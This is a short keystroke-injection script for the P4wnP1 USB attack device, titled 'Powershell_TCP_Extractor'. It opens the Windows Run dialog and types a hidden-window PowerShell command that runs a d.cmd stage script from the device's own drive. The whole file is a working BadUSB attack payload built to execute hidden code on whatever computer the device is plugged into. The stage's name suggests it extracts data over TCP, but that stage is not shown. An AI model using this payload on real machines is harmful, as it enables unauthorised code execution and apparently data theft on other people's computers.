//Powershell_TCP_Extractor
layout('us');		
typingSpeed(0,0)
press("GUI r");
delay(500);
type("powershell -w h \".((gwmi win32_volume -f 'label=''P4WNP1''').Name+'Powershell_TCP_Extractor\\d.cmd')\"\n")
delay(1000);
